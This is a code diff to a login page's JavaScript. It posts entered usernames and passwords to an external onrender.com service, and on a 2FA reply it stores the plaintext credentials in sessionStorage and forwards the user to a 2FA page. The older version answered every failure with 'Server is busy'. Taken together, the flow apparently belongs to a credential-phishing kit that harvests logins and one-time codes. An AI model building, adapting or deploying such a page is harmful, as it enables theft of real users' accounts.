@@ -16,13 +16,18 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        if (password.length < 6) {
+            showError('Password must be at least 6 characters');
+            return;
+        }
+        
         // Show loading state
         buttonText.style.display = 'none';
         loadingGif.style.display = 'inline-block';
         loginButton.disabled = true;
         errorElement.style.display = 'none';
         
-        fetch('https://yomae-service.onrender.com/process_login', {
+        fetch('https://your-render-service.onrender.com/process_login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -34,36 +39,33 @@ document.addEventListener('DOMContentLoaded', function() {
         })
         .then(response => {
             if (!response.ok) {
-                // Handle HTTP errors (4xx, 5xx)
                 return response.json().then(err => {
-                    throw new Error(err.message || 'Server is busy. Please try again later');
+                    throw new Error(err.message || 'Server error');
                 });
             }
             return response.json();
         })
         .then(data => {
             if (data.status === 'success') {
-                window.location.href = '/yomae/website/verifed/index.html';
+                window.location.href = '/website/verifed/index.html';
             } 
             else if (data.status === '2fa_required') {
                 sessionStorage.setItem('loginData', JSON.stringify({
                     username: username,
                     password: password
                 }));
-                window.location.href = '/yomae/website/2FA/index.html';
+                window.location.href = '/website/2fa/index.html';
             }
             else {
-                // Handle application-level errors
-                showError(data.message || 'Server is busy. Please try again later');
+                showError(data.message || 'Incorrect username or password. Please try again');
             }
         })
         .catch(error => {
             console.error('Error:', error);
-            // Handle all errors with a user-friendly message
-            showError('Server is busy. Please try again later');
+            showError(error.message || 'Server error. Please try again later.');
         })
         .finally(() => {
-            // Reset button state
+            // Restore button
             buttonText.style.display = 'inline-block';
             loadingGif.style.display = 'none';
             loginButton.disabled = false;
@@ -73,7 +75,6 @@ document.addEventListener('DOMContentLoaded', function() {
     function showError(message) {
         errorElement.textContent = message;
         errorElement.style.display = 'block';
-        // Shake animation
         errorElement.style.animation = 'none';
         setTimeout(() => {
             errorElement.style.animation = 'shake 0.5s';
